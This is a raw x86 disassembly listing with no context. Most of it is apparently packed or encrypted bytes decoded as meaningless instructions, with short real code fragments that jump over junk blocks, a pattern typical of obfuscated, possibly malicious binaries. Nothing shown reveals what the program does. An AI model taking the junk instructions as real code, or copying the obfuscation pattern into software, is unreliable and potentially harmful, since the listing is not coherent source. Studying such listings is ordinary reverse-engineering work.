  401911:	fnstenv ds:0x732db811
  401917:	sbb    DWORD PTR [ebx+0xe32d88b],esi
  40191d:	ret    
  40191e:	inc    ebx
  40191f:	inc    esp
  401920:	jecxz  0x401968
  401922:	cs aam 0x47
  401925:	gs cwde 
  401927:	mov    cl,0x86
  401929:	je     0x401904
  40192b:	stos   BYTE PTR es:[edi],al
  40192c:	push   ebp
  40192d:	in     al,dx
  40192e:	pop    ebp
  40192f:	add    eax,0x6f
  401932:	pop    ds
  401933:	dec    ebp
  401934:	add    al,0x60
  401936:	imul   ebx,DWORD PTR [ecx+ebx*4-0x3c],0x7a8847e0
  40193e:	out    dx,al
  40193f:	mov    esi,0xcb2216c2
  401944:	adc    BYTE PTR [eax-0x6c],bl
  401947:	or     DWORD PTR [esi+0x49],ebp
  40194a:	hlt    
  40194b:	and    al,0xc5
  40194d:	push   esp
  40194e:	es sub al,0x7a
  401951:	sbb    BYTE PTR [edx],dl
  401953:	out    0x38,al
  401955:	jp     0x4019cc
  401957:	in     eax,0x4e
  401959:	fsubr  DWORD PTR [ebp+0x5]
  40195c:	fwait
  40195d:	sbb    al,0xfd
  40195f:	adc    BYTE PTR [ecx-0x75],0x85
  401963:	(bad)  
  401964:	push   edx
  401965:	pusha  
  401966:	add    al,0x3a
  401968:	pop    esp
  401969:	dec    ebp
  40196a:	mov    ds:0xa3a848bd,eax
  40196f:	xchg   DWORD PTR [ebx+0x54ffeb5c],eax
  401975:	pop    es
  401976:	or     cl,dl
  401978:	push   ecx
  401979:	call   DWORD PTR [edx+0x75]
  40197c:	jbe    0x401984
  40197e:	mov    cl,0x1
  401980:	inc    ebp
  401981:	inc    ebx
  401982:	mov    esp,ecx
  401984:	pusha  
  401985:	pushf  
  401986:	ds jne 0x4019fd
  401989:	jo     0x4019af
  40198b:	imul   ebx,DWORD PTR [ecx-0x39],0xb048bb64
  401992:	fisttp WORD PTR [eax-0x50]
  401995:	std    
  401996:	call   0x2aa7:0xec97c1dd
  40199d:	aas    
  40199e:	add    al,0x9
  4019a0:	loop   0x401990
  4019a2:	cmp    eax,0x8b4f53d3
  4019a7:	xchg   BYTE PTR [ebp+0x4d],bh
  4019aa:	pop    ds
  4019ab:	stc    
  4019ac:	and    esp,DWORD PTR [edi]
  4019ae:	mov    al,0x77
  4019b0:	dec    ecx
  4019b1:	pop    ebx
  4019b2:	lods   al,BYTE PTR ds:[esi]
  4019b3:	mov    bl,0xcc
  4019b5:	sbb    esi,DWORD PTR [esi+ecx*4-0x3f]
  4019b9:	test   eax,0x73330c15
  4019be:	ss addr16 mov dh,0x7b
  4019c2:	xchg   dh,al
  4019c4:	cli    
  4019c5:	scas   al,BYTE PTR es:[edi]
  4019c6:	enter  0xbf22,0x34
  4019ca:	sbb    al,0xac
  4019cc:	adc    ebx,DWORD PTR [eax+0x7]
  4019cf:	and    esi,esi
  4019d1:	popf   
  4019d2:	mov    ecx,0xdefe0689
  4019d7:	cdq    
  4019d8:	mov    ds:0xc83b03bb,eax
  4019dd:	dec    edx
  4019de:	test   DWORD PTR [ebx],eax
  4019e0:	adc    al,0xab
  4019e2:	jo     0x401a54
  4019e4:	mov    dh,0x4b
  4019e6:	fiadd  WORD PTR [ebx+0x2]
  4019e9:	adc    dl,bh
  4019eb:	mov    bl,0xdf
  4019ed:	cmp    ebp,0x344435e2
  4019f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019f4:	jnp    0x401a18
  4019f6:	mov    edx,0x97e08331
  4019fb:	and    esp,DWORD PTR [eax-0x5ef9e290]
  401a01:	stc    
  401a02:	dec    esp
  401a03:	sub    eax,0xa3daea2e
  401a08:	xor    eax,0x703337c7
  401a0d:	pop    edi
  401a0e:	mov    BYTE PTR ds:0xb032fda3,ah
  401a14:	stos   BYTE PTR es:[edi],al
  401a15:	mov    ah,0x28
  401a17:	jmp    0xe1e5681c
  401a1c:	scas   eax,DWORD PTR es:[edi]
  401a1d:	cdq    
  401a1e:	loope  0x4019a7
  401a20:	cwde   
  401a21:	mov    ds:0xd14bd379,al
  401a26:	mov    bl,BYTE PTR [ecx-0x7fb8d341]
  401a2c:	push   0xe265118
  401a31:	adc    eax,0xde886a5a
  401a36:	test   esp,edx
  401a38:	or     bl,bh
  401a3a:	call   0xe41f:0xfd93fc3b
  401a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a42:	lods   al,BYTE PTR ds:[esi]
  401a43:	cmp    al,0xd9
  401a45:	jbe    0x401aac
  401a47:	mov    dh,0xdd
  401a49:	retf   0x32e
  401a4c:	mov    ebx,0x6c527dc7
  401a51:	sub    edi,DWORD PTR [ecx]
  401a53:	jge    0x401ac6
  401a55:	xlat   BYTE PTR ds:[ebx]
  401a56:	jbe    0x401ab0
  401a58:	sub    eax,0x3774246b
  401a5d:	dec    ebp
  401a5e:	xor    eax,edx
  401a60:	push   ebx
  401a61:	mov    ebp,0x8108458b
  401a66:	and    eax,0x4345cf
  401a6b:	add    BYTE PTR [eax],al
  401a6d:	add    BYTE PTR [eax],al
  401a6f:	mov    ecx,DWORD PTR ds:0x4345cf
  401a75:	inc    ecx
  401a76:	mov    DWORD PTR ds:0x4345cf,ecx
  401a7c:	cmp    DWORD PTR ds:0x4345cf,0x5
  401a83:	jne    0x401a92
  401a89:	push   DWORD PTR [ebp-0x24]
  401a8c:	call   DWORD PTR ds:0x413274
  401a92:	cmp    DWORD PTR ds:0x4345cf,0x4
  401a99:	jne    0x401aae
  401a9f:	xor    ecx,ecx
  401aa1:	or     ecx,DWORD PTR ds:0x4345cf
  401aa7:	inc    ecx
  401aa8:	mov    DWORD PTR ds:0x4345cf,ecx
  401aae:	cmp    DWORD PTR ds:0x4345cf,0x11
  401ab5:	jb     0x401a6f
  401abb:	mov    ecx,DWORD PTR [ebp-0x10]
  401abe:	xor    eax,esi
  401ac0:	add    eax,edi
  401ac2:	mov    DWORD PTR [ecx],eax
  401ac4:	mov    eax,DWORD PTR [ebp-0x10]
  401ac7:	mov    ecx,DWORD PTR [ebp+0x10]
  401aca:	xor    ecx,esi
  401acc:	mov    edx,0xffcd8d67
  401ad1:	sub    edx,ecx
  401ad3:	add    DWORD PTR [eax],edx
  401ad5:	jmp    0x401ca9
  401ada:	icebp  
  401adb:	jmp    0x401a65
  401add:	imul   ebx,DWORD PTR [ebp+esi*2-0x17498c0f],0x4f88485e
  401ae8:	push   es
  401ae9:	and    eax,0x7e7e0452
  401aee:	mov    ch,0x7f
  401af0:	jle    0x401b70
  401af2:	mov    bl,0x9a
  401af4:	mov    eax,ds:0xc381b9d0
  401af9:	into   
  401afa:	mov    ah,BYTE PTR [edi-0x6b5b9e21]
  401b00:	sar    BYTE PTR [edx+0x2b3fb071],cl
  401b06:	inc    ebx
  401b07:	inc    DWORD PTR [edi]
  401b09:	fcomp  DWORD PTR [esp+edi*1]
  401b0c:	mov    esi,0x4d7f8a2
  401b11:	pop    ds
  401b12:	xor    BYTE PTR [ebp-0x22a77ce2],0x8c
  401b19:	push   cs
  401b1a:	push   ebp
  401b1b:	and    bh,BYTE PTR [ebx]
  401b1d:	mov    DWORD PTR [ebx+0x55],esi
  401b20:	lea    edx,[esp+eiz*8-0x5de65db5]
  401b27:	adc    ch,0x38
  401b2a:	fcmove st,st(0)
  401b2c:	xor    BYTE PTR [eax],al
  401b2e:	fdivrp st(6),st
  401b30:	mov    esp,0x124cffb6
  401b35:	jl     0x401b5a
  401b37:	fcom   QWORD PTR [eax-0x46]
  401b3a:	popf   
  401b3b:	aam    0x94
  401b3d:	add    DWORD PTR [eax-0x79],edx
  401b40:	inc    edx
  401b41:	pop    eax
  401b42:	addr16 push ebx
  401b44:	ins    DWORD PTR es:[edi],dx
  401b45:	retf   
  401b46:	inc    esi
  401b47:	cwde   
  401b48:	in     eax,dx
  401b49:	push   0xe0555c85
  401b4e:	mov    bh,0xff
  401b50:	cdq    
  401b51:	push   eax
  401b52:	mul    ebx
  401b54:	je     0x401bbd
  401b56:	pop    ebp
  401b57:	sbb    ebp,ebp
  401b59:	retf   
  401b5a:	sbb    BYTE PTR [esi],dl
  401b5c:	add    ebp,DWORD PTR [edi+0x66e6bf81]
  401b62:	sub    BYTE PTR [ecx-0x3b],0xfc
  401b66:	pop    ecx
  401b67:	dec    esp
  401b68:	popa   
  401b69:	adc    ebp,DWORD PTR [edx-0x2a]
  401b6c:	test   ah,al
  401b6e:	imul   edi,edx,0x9006ffbf
  401b74:	shr    BYTE PTR [eax],1
  401b76:	xor    al,0x11
  401b78:	pop    ss
  401b79:	pop    edx
  401b7a:	retf   0xdd4d
  401b7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b7e:	or     edi,DWORD PTR [esi-0x452ae3dd]
  401b84:	dec    edx
  401b85:	add    al,0xea
  401b87:	(bad)  
  401b88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b89:	xor    dl,bh
  401b8b:	xchg   edx,eax
  401b8c:	push   ss
  401b8d:	cmp    DWORD PTR [ecx],ebp
  401b8f:	pop    eax
  401b90:	int    0x83
  401b92:	and    ch,BYTE PTR [esi-0x3a]
  401b95:	out    dx,al
  401b96:	add    BYTE PTR [edx],dl
  401b98:	adc    ebp,esp
  401b9a:	in     eax,dx
  401b9b:	sbb    edx,DWORD PTR [ebx+0x7]
  401b9e:	div    edx
  401ba0:	or     esi,edx
  401ba2:	sbb    BYTE PTR ds:0xcaa25552,ah
  401ba8:	mov    edi,0xe23f4efe
  401bad:	pop    ecx
  401bae:	mov    bh,0x17
  401bb0:	outs   dx,DWORD PTR ds:[esi]
  401bb1:	push   esi
  401bb2:	cmp    ah,BYTE PTR [edx+0x1]
  401bb5:	cmp    esi,DWORD PTR [edi-0x5154798f]
  401bbb:	les    esi,FWORD PTR [ecx+0x7b21c76f]
  401bc1:	mov    dh,0x67
  401bc3:	mov    bh,0x26
  401bc5:	inc    eax
  401bc6:	imul   BYTE PTR [edi+0x70c7935c]
  401bcc:	and    eax,0x781fadeb
  401bd1:	mov    es,ecx
  401bd3:	cmp    bh,BYTE PTR [esi-0x9be933b]
  401bd9:	pop    edx
  401bda:	mov    cl,0xdc
  401bdc:	and    eax,0xffb528df
  401be1:	xchg   esi,eax
  401be2:	gs sub al,0xad
  401be5:	push   edi
  401be6:	xchg   ecx,eax
  401be7:	loope  0x401c2c
  401be9:	sub    eax,0xc9554cc5
  401bee:	pop    ebx
  401bef:	dec    edi
  401bf0:	pushf  
  401bf1:	addr16 daa 
  401bf3:	sbb    al,0xe8
  401bf5:	icebp  
  401bf6:	les    edi,FWORD PTR [ebx+edi*1-0x37]
  401bfa:	jp     0x401bac
  401bfc:	setp   BYTE PTR [edi-0x1d]
  401c00:	mov    dl,0x0
  401c02:	sbb    al,0x9e
  401c04:	xor    ebx,ecx
  401c06:	retf   0xdd6a
  401c09:	sahf   
  401c0a:	jp     0x401c40
  401c0c:	jp     0x4342e019
  401c12:	push   ds
  401c13:	sbb    cl,dh
  401c15:	not    DWORD PTR [ebx+eiz*8-0x165f1b96]
  401c1c:	fisub  DWORD PTR [ebx+0x4a31b44f]
  401c22:	fild   WORD PTR [edi-0x4c]
  401c25:	addr16 imul eax,esi,0xffffffa2
  401c29:	fucomp st(3)
  401c2b:	enter  0xd716,0x36
  401c2f:	cdq    
  401c30:	scas   eax,DWORD PTR es:[edi]
  401c31:	sub    BYTE PTR [esi-0x4b],0xec
  401c35:	arpl   WORD PTR [edx+0x7cd1f88f],dx
  401c3b:	sbb    ah,dl
  401c3d:	mov    ah,0xd3
  401c3f:	es pop es
  401c41:	push   edi
  401c42:	xchg   edi,eax
  401c43:	adc    ah,BYTE PTR [ebx-0x4e401ef3]
  401c49:	ds mov bp,0xf1ef
  401c4e:	in     al,0x91
  401c50:	sbb    ebp,ecx
  401c52:	vandps xmm3,xmm1,XMMWORD PTR [eax+0x101b2c28]
  401c5a:	push   ss
  401c5b:	mov    ah,0x2b
  401c5d:	dec    ecx
  401c5e:	sub    eax,0x3cc6d5e8
  401c63:	or     edi,DWORD PTR [edi-0x43]
  401c66:	cmc    
  401c67:	mov    eax,ds:0x1e791a1
  401c6c:	mov    edi,ebx
  401c6e:	aaa    
  401c6f:	dec    edi
  401c70:	je     0x401c94
  401c72:	nop
  401c73:	adc    ebx,DWORD PTR [edi+0x21]
  401c76:	and    al,0xaf
  401c78:	jns    0x401cd5
  401c7a:	and    BYTE PTR [eax],bl
  401c7c:	cmp    al,0x1d
  401c7e:	imul   esp,DWORD PTR [edi*8-0x65faee4a],0xfffffff4
  401c86:	adc    bl,dh
  401c88:	ret    0x5588
  401c8b:	xchg   edi,eax
  401c8c:	(bad)  
  401c8d:	lahf   
  401c8e:	rol    DWORD PTR [eax],cl
  401c90:	(bad)  
  401c91:	push   ecx
  401c92:	pop    ebp
  401c93:	idiv   bh
  401c95:	in     al,0x8f
  401c97:	or     DWORD PTR [edi],ebp
  401c99:	xchg   esi,eax
  401c9a:	pop    edx
  401c9b:	cmp    DWORD PTR ds:0xc40832ed,edi
  401ca1:	pop    es
  401ca2:	jle    0x401cdc
  401ca4:	in     al,0x30
  401ca6:	mov    dl,0xc3
  401ca8:	lea    esp,[ecx+0x414bd2]
  401cae:	mov    eax,DWORD PTR [eax]
  401cb0:	mov    cx,WORD PTR [ebp-0x4]
  401cb4:	movzx  ecx,cx
  401cb7:	add    ecx,DWORD PTR [eax]
  401cb9:	jmp    0x401e8d
  401cbe:	push   edi
  401cbf:	mov    DWORD PTR ds:0x7d73cde7,eax
  401cc5:	test   eax,0x7c3826d3
  401cca:	fsub   st(0),st
  401ccc:	aam    0x44
  401cce:	mov    DWORD PTR [esi],eax
  401cd0:	jle    0x401d50
  401cd2:	mov    ch,0x7f
  401cd4:	jle    0x401d54
  401cd6:	fld    st(1)
  401cd8:	jle    0x401c68
  401cda:	pop    esi
  401cdb:	cmp    edi,DWORD PTR [ebx-0x70c03d39]
  401ce1:	lock or al,0xd1
  401ce4:	in     eax,0x1f
  401ce6:	pushf  
  401ce7:	cmp    eax,0x4568338a
  401cec:	bound  esi,QWORD PTR [eax]
  401cee:	adc    eax,0xc3c10237
  401cf3:	scas   al,BYTE PTR es:[edi]
  401cf4:	add    esp,DWORD PTR [edx]
  401cf6:	(bad)  
  401cf7:	push   ss
  401cf8:	push   edx
  401cf9:	sahf   
  401cfa:	mov    esi,0xb5511ef9
  401cff:	mov    ebx,0xcba7ce24
  401d04:	and    cl,0x1e
  401d07:	arpl   WORD PTR [edx-0x36c5ea3c],bp
  401d0d:	stc    
  401d0e:	in     al,0x38
  401d10:	adc    eax,0x86e32e14
  401d15:	imul   edx,DWORD PTR [esi-0x58713644],0x569eb844
  401d1f:	inc    ax
  401d21:	rcr    DWORD PTR [ecx],cl
  401d23:	(bad)  
  401d25:	inc    eax
  401d26:	repz or ecx,DWORD PTR [ecx+0x55]
  401d2a:	and    BYTE PTR [ecx-0x37],dh
  401d2d:	pop    esi
  401d2e:	pop    esi
  401d2f:	cmp    ebx,DWORD PTR [edi+ebp*2]
  401d32:	test   eax,0xd1c3d871
  401d37:	jne    0x401cea
  401d39:	inc    esp
  401d3a:	mov    cl,0x2f
  401d3c:	mov    eax,0x1647b87
  401d41:	pusha  
  401d42:	mov    bh,0x70
  401d44:	sbb    al,0x8b
  401d46:	or     eax,0x267c7399
  401d4b:	jo     0x401d80
  401d4d:	adc    bh,BYTE PTR es:[esi-0x51e670ae]
  401d54:	xchg   edx,eax
  401d55:	(bad)  
  401d56:	jo     0x401d0d
  401d58:	adc    DWORD PTR [edx-0x66],edi
  401d5b:	jbe    0x401db9
  401d5d:	lahf   
  401d5e:	xor    al,0x0
  401d60:	ret    0xce8c
  401d63:	popa   
  401d64:	xor    edx,DWORD PTR [edx+0x2f41bc27]
  401d6a:	sub    WORD PTR [ecx-0x38],di
  401d6e:	mov    eax,ds:0xcdd345a9
  401d73:	jp     0x401d79
  401d75:	hlt    
  401d76:	test   eax,ebx
  401d78:	mov    esp,0x46839dba
  401d7d:	sub    BYTE PTR [ecx+0x23955b61],cl
  401d83:	mov    al,ds:0x7be51104
  401d88:	repnz aas 
  401d8a:	outs   dx,DWORD PTR ds:[esi]
  401d8b:	push   eax
  401d8c:	retf   0x9761
  401d8f:	test   BYTE PTR [edx-0x35414823],0x68
  401d96:	lock jmp 0xd272:0x89b43c09
  401d9e:	xchg   esi,eax
  401d9f:	and    ecx,ecx
  401da1:	inc    edi
  401da2:	sub    ebp,DWORD PTR ds:0x20d3ec13
  401da8:	into   
  401da9:	mov    ecx,0x3d41ce21
  401dae:	iret   
  401daf:	sahf   
  401db0:	add    edi,eax
  401db2:	jecxz  0x401dfb
  401db4:	popf   
  401db5:	jge    0x401d5d
  401db7:	cli    
  401db8:	and    cl,ch
  401dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dbb:	lods   eax,DWORD PTR ds:[esi]
  401dbc:	test   DWORD PTR [esi-0x52],esp
  401dbf:	pop    ecx
  401dc0:	push   eax
  401dc1:	popf   
  401dc2:	lock fstp DWORD PTR [edi+0x64]
  401dc6:	jno    0x401e46
  401dc8:	sbb    ebp,DWORD PTR [edi+ebx*2]
  401dcb:	imul   ebp,DWORD PTR [esi-0x29],0x8374c119
  401dd2:	pop    esp
  401dd3:	pushf  
  401dd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dd5:	push   eax
  401dd6:	and    DWORD PTR [eax+0x6e],ebx
  401dd9:	bnd ja 0x401e14
  401ddc:	stos   DWORD PTR es:[edi],eax
  401ddd:	xchg   edi,eax
  401dde:	xor    ch,BYTE PTR [ebx]
  401de0:	add    DWORD PTR [ebx-0x3e],esi
  401de3:	adc    eax,0x3196c226
  401de8:	lea    edx,[edi-0x4f]
  401deb:	pusha  
  401dec:	jo     0x401e4c
  401dee:	or     BYTE PTR [esi+0x3e],bh
  401df1:	jb     0x401d9e
  401df3:	xor    dh,dl
  401df5:	out    0x7,eax
  401df7:	xchg   esp,eax
  401df8:	sub    bl,BYTE PTR [edx-0x391bbe81]
  401dfe:	icebp  
  401dff:	ret    
  401e00:	add    BYTE PTR [edx+0x1a],ah
  401e03:	ins    DWORD PTR es:[edi],dx
  401e04:	mov    dh,0xe
  401e06:	pop    ss
  401e07:	sti    
  401e08:	sub    DWORD PTR [edx+eiz*4+0x28],ebx
  401e0c:	sub    esp,esp
  401e0e:	fisub  DWORD PTR [edx-0x3d]
  401e11:	bound  edi,QWORD PTR [edx-0x42]
  401e14:	adc    ah,BYTE PTR [ecx+ebx*8+0x75915345]
  401e1b:	dec    ecx
  401e1c:	in     eax,0x3e
  401e1e:	or     esi,DWORD PTR [edx]
  401e20:	in     al,0xdb
  401e22:	cdq    
  401e23:	xor    ch,BYTE PTR [ebx-0x5ad96041]
  401e29:	enter  0x534a,0xfd
  401e2d:	(bad)
  401e30:	sahf   
  401e31:	push   ss
  401e32:	and    eax,0x85f20d81
  401e37:	xchg   esi,eax
  401e38:	in     eax,0xee
  401e3a:	or     dl,cl
  401e3c:	jo     0x401e52
  401e3e:	sub    ch,BYTE PTR [ebp+edx*4-0x2a]
  401e42:	xor    al,0xff
  401e44:	xchg   esp,eax
  401e45:	aam    0xca
  401e47:	jecxz  0x401e85
  401e49:	cmp    BYTE PTR [ebx],ah
  401e4b:	push   0xffffff8b
  401e4d:	popa   
  401e4e:	stc    
  401e4f:	pop    es
  401e50:	mov    bh,0x5c
  401e52:	ins    DWORD PTR es:[edi],dx
  401e53:	sbb    DWORD PTR [ecx+0x6dc080a6],ebx
  401e59:	call   0x94d2:0xd17dd727
  401e60:	inc    edi
  401e61:	pop    ebx
  401e62:	xchg   edi,eax
  401e63:	mov    cl,0x91
  401e65:	mov    ah,0x16
  401e67:	or     DWORD PTR [ebp+0x534058ab],esi
  401e6d:	out    dx,al
  401e6e:	pop    edx
  401e6f:	lock jg 0x401e9c
  401e72:	jl     0x401e69
  401e74:	sub    al,0x16
  401e76:	data16 movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  401e79:	xor    DWORD PTR [edx+eax*4+0x5b224424],edx
  401e80:	sbb    edx,ebp
  401e82:	test   al,0xf5
  401e84:	aad    0x62
  401e86:	(bad)  
  401e87:	adc    eax,ebp
  401e89:	std    
  401e8a:	icebp  
  401e8b:	jnp    0x401eaa
  401e8d:	mov    DWORD PTR [ebp-0x18],ecx
  401e90:	mov    eax,DWORD PTR [ebp+0xc]
  401e93:	mov    ecx,DWORD PTR [ebp+0xc]
  401e96:	xor    eax,esi
  401e98:	add    eax,eax
  401e9a:	xor    ecx,esi
  401e9c:	sub    ecx,eax
  401e9e:	jmp    0x402072
  401ea3:	xchg   ecx,eax
  401ea4:	sahf   
  401ea5:	loopne 0x401e95
  401ea7:	icebp  
  401ea8:	jo     0x401e3b
  401eaa:	popa   
  401eab:	mov    eax,ds
  401ead:	cmp    DWORD PTR [edi],esi
  401eaf:	xor    al,0xde
  401eb1:	pop    ebp
  401eb2:	pop    esi
  401eb3:	rol    BYTE PTR [eax],0x7e
  401eb6:	jle    0x401e6d
  401eb8:	jg     0x401f38
  401eba:	jle    0x401e51
  401ebc:	jae    0x401ea7
  401ebe:	inc    esi
  401ebf:	jmp    0x557281ec
  401ec4:	mov    esi,0xa12ec261
  401ec9:	push   edi
  401eca:	dec    eax
  401ecb:	out    0xae,eax
  401ecd:	push   edx
  401ece:	xor    al,0x7
  401ed0:	sbb    edx,DWORD PTR [ecx-0x5d]
  401ed3:	mov    eax,ds:0xd4e8b908
  401ed8:	dec    esp
  401ed9:	or     DWORD PTR [ebp+edi*8+0x50],0xff6a7fa9
  401ee1:	mov    eax,ds:0xd81433b
  401ee6:	imul   edx,DWORD PTR [ebp+0x169a4258],0xd8e64590
  401ef0:	in     eax,0x63
  401ef2:	sbb    al,BYTE PTR [ebp+0x22]
  401ef5:	dec    edi
  401ef6:	xor    edi,DWORD PTR [edi+0x6c]
  401ef9:	xchg   BYTE PTR [ecx-0x5bafa31e],ch
  401eff:	mov    edi,0x49eaee41
  401f04:	ffreep st(3)
  401f06:	iret   
  401f07:	mov    ebx,0x6f39d0ec
  401f0c:	push   edi
  401f0d:	xchg   edx,eax
  401f0e:	mov    dl,0x27
  401f10:	mov    al,0x14
  401f12:	lods   eax,DWORD PTR ds:[esi]
  401f13:	ret    
  401f14:	test   eax,0x6e36e7d9
  401f19:	xlat   BYTE PTR ds:[ebx]
  401f1a:	sbb    DWORD PTR [edi-0x4f01edfd],0x2583d600
  401f24:	inc    ebp
  401f25:	sbb    edi,DWORD PTR [eax+0x3df19856]
  401f2b:	xchg   esp,eax
  401f2c:	or     ah,BYTE PTR [edi-0x6d]
  401f2f:	fld    QWORD PTR [eax+esi*8]
  401f32:	mov    ch,BYTE PTR [ebx]
  401f34:	stos   BYTE PTR es:[edi],al
  401f35:	and    ah,bh
  401f37:	mov    BYTE PTR [ebx],dl
  401f39:	add    DWORD PTR [ebp+ebx*8+0x38],ecx
  401f3d:	mov    es,WORD PTR [ecx-0x4]
  401f40:	repnz pusha 
  401f42:	sub    al,ch
  401f44:	sbb    DWORD PTR ss:[ebx+0x11],0x70
  401f49:	sti    
  401f4a:	loopne 0x401ee2
  401f4c:	int    0x18
  401f4e:	popa   
  401f4f:	adc    DWORD PTR [ebp+0x6],edx
  401f52:	das    
  401f53:	call   0x37e:0x8fecaf0d
  401f5a:	test   eax,0x4aca83c6
  401f5f:	or     dh,BYTE PTR [edi+0x1ef22cd]
  401f65:	push   0xb007567c
  401f6a:	and    al,0xaf
  401f6c:	out    0xca,al
  401f6e:	inc    ecx
  401f6f:	(bad)  
  401f70:	xor    DWORD PTR [ecx-0x6e3067e9],eax
  401f76:	adc    BYTE PTR [ebx-0x5c1ee08b],ch
  401f7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f7d:	lods   al,BYTE PTR ds:[esi]
  401f7e:	push   eax
  401f7f:	ins    BYTE PTR es:[edi],dx
  401f80:	mov    al,fs:0xd26da563
  401f86:	mov    ds:0xd296d593,eax
  401f8b:	jnp    0x401f2a
  401f8d:	ret    0xe496
  401f90:	cwde   
  401f91:	mov    edx,cr2
  401f94:	lock imul esi,DWORD PTR [ebx-0x39],0xd501bc0d
  401f9c:	inc    ebp
  401f9d:	dec    ecx
  401f9e:	adc    ch,dl
  401fa0:	bound  edi,QWORD PTR [edx-0x1b]
  401fa3:	jp     0x401fb1
  401fa5:	xchg   esp,eax
  401fa6:	cmp    eax,0xd385f4d8
  401fab:	or     eax,0x79047e0c
  401fb0:	les    esp,FWORD PTR [esi-0x79]
  401fb3:	pop    eax
  401fb4:	push   edx
  401fb5:	cdq    
  401fb6:	ror    BYTE PTR [esi],cl
  401fb8:	jne    0x401ff7
  401fba:	push   esp
  401fbb:	je     0x402027
  401fbd:	arpl   WORD PTR [ebx],ax
  401fbf:	out    dx,eax
  401fc0:	add    al,0xb
  401fc2:	fs or  al,0xb1
  401fc5:	dec    ebx
  401fc6:	xchg   ebx,eax
  401fc7:	scas   al,BYTE PTR es:[edi]
  401fc8:	pmulhw mm7,mm2
  401fcb:	or     BYTE PTR ds:0xe4631f29,ch
  401fd1:	mov    ds:0xe3fda60,eax
  401fd6:	sub    DWORD PTR [edi+0x7734534e],ecx
  401fdc:	rcr    DWORD PTR [esi+0x77],0xbe
  401fe0:	mov    bh,0x1
  401fe2:	je     0x40200e
  401fe4:	mov    dl,0x4f
  401fe6:	jmp    0x6db697b5
  401feb:	pop    edi
  401fec:	imul   BYTE PTR [ebx+ebx*1]
  401fef:	addr16 sbb al,0xc2
  401ff2:	sbb    dh,bl
  401ff4:	gs dec esp
  401ff6:	mov    bh,dh
  401ff8:	mov    al,ds:0x2dbc1a3d
  401ffd:	dec    edi
  401ffe:	push   ebx
  401fff:	lods   al,BYTE PTR ds:[esi]
  402000:	push   esp
  402001:	rcl    BYTE PTR [eax-0x8],0xd2
  402005:	out    dx,al
  402006:	cmp    al,0xae
  402008:	fild   QWORD PTR [ebp-0x4b]
  40200b:	lock pushf 
  40200d:	lea    edx,[ecx+0x50]
  402010:	cmp    BYTE PTR [esi],0xe3
  402013:	push   cs
  402014:	aam    0x95
  402016:	ja     0x7f17482c
  40201c:	mov    cl,0xc8
  40201e:	sbb    DWORD PTR [eax+esi*8-0x26a29906],ebx
  402025:	lods   eax,DWORD PTR ds:[esi]
  402026:	lea    edx,[ecx-0x7925eb13]
  40202c:	jnp    0x402051
  40202e:	pop    ebx
  40202f:	mov    ecx,0x1c7346d8
  402034:	aas    
  402035:	mov    ecx,0x95ee99f8
  40203a:	pop    esp
  40203b:	(bad)  
  40203c:	mov    ebp,0x695673b4
  402041:	fcom   QWORD PTR [ebx]
  402043:	ja     0x402067
  402045:	sbb    al,0x0
  402047:	(bad)  
  402048:	and    eax,ebp
  40204a:	nop
  40204b:	jmp    0x1fdd2221
  402050:	retf   
  402051:	sub    ebx,esi
  402053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402054:	cmp    eax,0x49a18030
  402059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40205a:	sub    esi,0xc6ab462c
  402060:	mov    dh,0xd9
  402062:	in     al,dx
  402063:	mov    ecx,0xda77b088
  402068:	rcr    DWORD PTR ds:0x2a146f69,0xd1
  40206f:	push   esi
  402070:	push   ecx
  402071:	sbb    ah,BYTE PTR [esi-0x75]
  402074:	inc    ebp
  402075:	cld    
  402076:	movzx  eax,ax
  402079:	sub    ecx,edi
  40207b:	cmp    eax,ecx
  40207d:	mov    eax,DWORD PTR [ebp+0x10]
  402080:	movzx  ecx,WORD PTR [ebp-0x4]
  402084:	jg     0x40226d
  40208a:	xor    eax,esi
  40208c:	sub    ecx,eax
  40208e:	sub    ecx,edi
  402090:	jmp    0x402264
  402095:	pop    es
  402096:	sbb    DWORD PTR [ecx+ebx*2],esi
  402099:	cmp    al,0x75
  40209b:	push   ebx
  40209c:	popa   
  40209d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40209e:	ins    DWORD PTR es:[edi],dx
  40209f:	std    
  4020a0:	and    DWORD PTR [ecx+0x7f25362a],edi
  4020a6:	add    bh,BYTE PTR [esi+0x7e]
  4020a9:	mov    ch,0x7f
  4020ab:	jle    0x40212b
  4020ad:	jecxz  0x402098
  4020af:	out    dx,al
  4020b0:	pop    ebp
  4020b1:	dec    edx
  4020b2:	je     0x402063
  4020b4:	rcr    BYTE PTR [edi+esi*8+0x1aeaa413],0xb1
  4020bc:	ror    DWORD PTR [edx-0x18d90856],1
  4020c2:	lea    ebp,[esi+0x5157cc0a]
  4020c8:	cmp    ah,BYTE PTR ds:0x9cccd04b
  4020ce:	div    BYTE PTR [edi-0x4bc80e1b]
  4020d4:	fdiv   DWORD PTR [eax]
  4020d6:	add    al,0x32
  4020d8:	mov    bh,0x1a
  4020da:	jne    0x402147
  4020dc:	dec    esp
  4020dd:	aas    
  4020de:	add    ebx,DWORD PTR [ebx-0x56468a44]
  4020e4:	outs   dx,BYTE PTR ds:[esi]
  4020e5:	sub    eax,0x1451d277
  4020ea:	bound  esi,QWORD PTR [edi-0x1f16ec35]
  4020f0:	sbb    eax,0xb72d1d79
  4020f5:	into   
  4020f6:	lock or esi,ebx
  4020f9:	inc    edx
  4020fa:	and    cl,ah
  4020fc:	sbb    eax,0x6a30c82b
  402101:	sbb    al,BYTE PTR [edx]
  402103:	outs   dx,DWORD PTR ds:[esi]
  402104:	je     0x402124
  402106:	xchg   edi,eax
  402107:	push   esp
  402108:	stc    
  402109:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40210a:	loop   0x402116
  40210c:	mov    eax,0x5d9d722
  402111:	mov    bh,ch
  402113:	push   cs
